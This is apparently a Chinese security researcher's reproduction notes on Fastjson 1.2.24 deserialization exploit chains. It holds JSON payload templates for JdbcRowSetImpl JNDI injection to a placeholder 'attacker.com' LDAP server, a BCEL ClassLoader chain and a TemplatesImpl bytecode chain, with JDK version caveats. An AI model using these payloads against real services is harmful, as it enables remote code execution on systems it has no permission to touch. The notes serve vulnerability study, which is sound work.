# 1.2.24
没有引入autotype机制，他的反序列化利用主要是以下几个链

## JdbcRowSetImpl (JNDI）
目标需要出网，jdk>8u191默认禁止ldap

```
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```

![](/images/绕过/20251211-33.png)
接下来，生成payload在进行jndi注入
![](/images/绕过/20251211-32.png)
【这里注意下需要支持jndi注入的jdk版本。8u121之前无限制，121-191有默认限制，需要com.sun.jndi.ldap.object.trustURLCodebase=true，这里复现的时候用的jdk8u171，所以在这里配置了vm options】
-Dcom.sun.jndi.ldap.object.trustURLCodebase=true
![](/images/绕过/20251211-31.png)

## BCLE(不出网)
目标需要有bcle库，tomcat环境常见

```
{
  "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
  "driverClassLoader": {
    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  },
  "driverClassName": "$$BCEL$$..."
}
```

## TemplatesImpl (文件写入+代码执行)
不出网，但是需要Feature.SupportNonPublicField特性

```
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["yv66vg..."],  // Base64编码的字节码
  "_name": "a.b",
  "_tfactory": {},
  "_outputProperties": {}
}
```

这里的bytecodes需要经过一系列的java-class-base64
